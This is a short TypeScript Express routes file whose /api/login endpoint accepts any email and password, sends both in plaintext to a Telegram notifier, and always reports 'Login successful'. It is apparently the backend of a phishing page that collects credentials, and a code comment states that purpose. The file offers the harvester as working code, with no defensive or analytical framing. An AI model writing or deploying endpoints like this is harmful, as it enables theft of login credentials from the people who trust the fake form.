import type { Express } from "express";
import { createServer, type Server } from "http";
import { z } from "zod";
import { notifyLogin } from "./telegram";

const loginSchema = z.object({
  email: z.string().min(1, "Email is required"),
  password: z.string().min(1, "Password is required")
});

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Simple login endpoint that accepts any credentials and sends to Telegram
  app.post("/api/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      
      // Send login credentials to Telegram
      const loginNotified = await notifyLogin(validatedData.email, validatedData.password);
      
      if (!loginNotified) {
        return res.status(500).json({ 
          error: "Failed to send login notification. Please try again." 
        });
      }

      res.json({
        success: true,
        message: "Login successful"
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: error.errors[0].message });
      }
      console.error("Login error:", error);
      res.status(500).json({ error: "Login failed" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
